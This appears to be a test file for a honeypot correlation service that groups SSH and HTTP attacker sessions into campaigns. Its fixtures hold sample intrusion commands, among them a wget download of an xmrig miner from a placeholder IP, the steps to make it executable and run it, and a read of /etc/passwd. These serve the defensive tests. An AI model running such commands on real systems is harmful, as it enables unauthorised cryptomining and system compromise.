from __future__ import annotations

from datetime import datetime, timedelta, timezone

from app.correlation.features import CorrelationContext, Session
from app.correlation.scoring import ALGORITHM_VERSION


def _ts(minutes_ago: float) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)).isoformat()


def _ssh_events(
    *,
    session_id: str,
    ip: str,
    commands: list[str],
    usernames: list[str],
    start_minutes: float = 60,
    client: str = "SSH-2.0-libssh_0.9.6",
    collector: str = "test-collector",
    indicators: list[str] | None = None,
) -> list[dict]:
    events: list[dict] = []
    offset = 0.0
    for index, username in enumerate(usernames):
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": _ts(start_minutes - offset),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.login_failed",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "low",
                "provenance": {
                    "collector": collector,
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": indicators or [],
                },
                "features": {"username": username, "success": False, "client_version": client},
            }
        )
        offset += 0.4
    for command in commands:
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": _ts(start_minutes - offset),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.command",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "medium",
                "provenance": {
                    "collector": collector,
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": indicators or [],
                },
                "features": {
                    "command": command,
                    "username": usernames[0] if usernames else "root",
                    "success": True,
                    "client_version": client,
                },
            }
        )
        offset += 0.7
    return events


def _http_events(
    *, session_id: str, ip: str, paths: list[str], user_agent: str, start_minutes: float = 50
) -> list[dict]:
    events = []
    for index, path in enumerate(paths):
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": _ts(start_minutes - index * 0.3),
                "source_module": "honeypot",
                "event_type": "honeypot.http.request",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-http-1",
                "severity": "info",
                "provenance": {
                    "collector": "test-collector",
                    "source": "http-decoy",
                    "reliability": 0.8,
                    "synthetic": True,
                },
                "features": {
                    "method": "GET",
                    "path": path,
                    "status": 404,
                    "user_agent": user_agent,
                },
            }
        )
    return events


def _ingest(client, headers, events):
    response = client.post("/api/v1/ingest/events", json=events, headers=headers)
    assert response.status_code == 202, response.text
    body = response.json()
    assert body["rejected"] == 0, body
    return body


def _campaigns(client, headers):
    response = client.get("/api/v1/campaigns", headers=headers)
    assert response.status_code == 200
    return response.json()["items"]


def test_multi_ip_related_sessions_become_campaign(client, sensor_headers, admin_headers):
    commands = [
        "uname -a",
        "cat /etc/passwd",
        "wget http://198.51.100.9/xmrig",
        "chmod +x xmrig",
        "./xmrig -o stratum+tcp://pool:3333",
    ]
    shared_indicator = "ja3:9c1f0b1a"
    sessions = [
        ("sess-attack-1", "203.0.113.11", 70),
        ("sess-attack-2", "203.0.113.12", 65),
        ("sess-attack-3", "203.0.113.13", 60),
    ]
    for session_id, ip, start in sessions:
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=session_id,
                ip=ip,
                commands=commands,
                usernames=["root", "admin"],
                start_minutes=start,
                indicators=[shared_indicator],
            ),
        )

    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200, run.text
    result = run.json()
    assert result["sessions"] == 3
    assert result["campaigns"] >= 1

    campaigns = _campaigns(client, admin_headers)
    target = next(item for item in campaigns if item["member_count"] == 3)
    assert target["ip_count"] == 3
    assert target["confidence"] >= 0.7
    assert "hypothesis" in target["summary"]

    detail = client.get(f"/api/v1/campaigns/{target['id']}", headers=admin_headers)
    assert detail.status_code == 200
    payload = detail.json()
    assert len(payload["sessions"]) == 3
    assert payload["edges"]
    explanation = payload["explanation"]
    assert explanation["risk"]["risk_score"] > 0
    assert explanation["confidence"] == target["confidence"]
    assert explanation["risk"]["severity"] == "medium"
    assert "ip" in explanation["why_flagged"].lower() or "IP" in explanation["why_flagged"]
    assert explanation["recommended_action"]

    edge = payload["edges"][0]
    evidence = edge["evidence"]
    assert evidence["algorithm_version"] == ALGORITHM_VERSION
    assert len(evidence["components"]) == 8
    assert "action_sequence" in {component["name"] for component in evidence["components"]}
    assert evidence["independent_families"]

    edge_detail = client.get(f"/api/v1/edges/{edge['id']}", headers=admin_headers)
    assert edge_detail.status_code == 200
    assert edge_detail.json()["risk"]["risk_score"] > 0
    assert edge_detail.json()["evidence"]["explanation"]


def test_same_ip_unrelated_behaviour_is_not_a_campaign(client, sensor_headers, admin_headers):
    _ingest(
        client,
        sensor_headers,
        _ssh_events(
            session_id="sess-same-ip-a",
            ip="198.51.100.44",
            commands=["uname -a", "id", "ls -la", "ifconfig", "netstat -ant"],
            usernames=["oracle"],
            start_minutes=40,
            client="SSH-2.0-OpenSSH_9.2",
        ),
    )
    _ingest(
        client,
        sensor_headers,
        _ssh_events(
            session_id="sess-same-ip-b",
            ip="198.51.100.44",
            commands=["xmrig --donate-level 1", "crontab -l", "echo hi > /tmp/x"],
            usernames=["ubnt", "support"],
            start_minutes=120,
            client="SSH-2.0-paramiko_3.1",
        ),
    )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200

    campaigns = _campaigns(client, admin_headers)
    assert not any(
        item["member_count"] >= 2 for item in campaigns
    ), "unrelated sessions sharing an IP must not be grouped"

    graph = client.get("/api/v1/graph", headers=admin_headers).json()
    session_edges = [
        edge for edge in graph["edges"] if edge["kind"] == "session_similarity"
    ]
    assert not any(edge["status"] == "active" for edge in session_edges)


def test_benign_lookalikes_are_not_grouped(client, sensor_headers, admin_headers):
    paths_a = ["/admin", "/login", "/robots.txt", "/sitemap.xml"]
    paths_b = ["/admin/", "/login/", "/robots.txt", "/favicon.ico"]
    _ingest(
        client,
        sensor_headers,
        _http_events(
            session_id="sess-benign-a", ip="192.0.2.10", paths=paths_a, user_agent="Mozilla/5.0 monitor"
        ),
    )
    _ingest(
        client,
        sensor_headers,
        _http_events(
            session_id="sess-benign-b", ip="192.0.2.11", paths=paths_b, user_agent="python-requests/2.31"
        ),
    )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200

    campaigns = _campaigns(client, admin_headers)
    assert not any(item["member_count"] >= 2 for item in campaigns)

    graph = client.get("/api/v1/graph", headers=admin_headers).json()
    assert any(node["kind"] == "session" for node in graph["nodes"])
    assert graph["algorithm_version"] == ALGORITHM_VERSION
    assert "hypothesis" in graph["note"]


def test_feedback_is_recorded_and_marks_campaign(client, sensor_headers, admin_headers):
    commands = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/tool"]
    for index in range(2):
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=f"sess-feedback-{index}",
                ip=f"203.0.113.{20 + index}",
                commands=commands,
                usernames=["root"],
                start_minutes=30 - index,
            ),
        )
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    campaign = _campaigns(client, admin_headers)[0]

    response = client.post(
        "/api/v1/feedback",
        headers=admin_headers,
        json={
            "object_type": "campaign",
            "object_id": campaign["id"],
            "label": "supported",
            "note": "Matches the ticket from the same morning.",
        },
    )
    assert response.status_code == 201
    updated = client.get(f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers).json()
    assert updated["campaign"]["status"] == "confirmed"

    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
    assert overview["counts"]["campaign"]["supported"] == 1
    assert "never retrains" in overview["note"]


def test_viewer_cannot_run_correlation(client, viewer_headers):
    response = client.post("/api/v1/correlate", json={}, headers=viewer_headers)
    assert response.status_code == 403


def test_small_corpus_does_not_filter_shared_evidence():
    """On a handful of sessions every token would look ubiquitous.

    The corpus filter must stay out of the way until document frequency is a
    meaningful estimate, otherwise identical sessions compare as empty.
    """

    sessions = [
        Session(
            id=f"sess-small-{index}",
            source_ips={f"198.51.100.{index + 1}"},
            usernames={"root"},
            clients={"SSH-2.0-libssh_0.9.6"},
            commands=["uname -a", "wget http://198.51.100.200/x"],
        )
        for index in range(6)
    ]
    context = CorrelationContext.from_sessions(sessions)

    assert context.n_sessions == 6
    assert context.is_informative("username", "root")
    assert context.is_informative("client", "SSH-2.0-libssh_0.9.6")
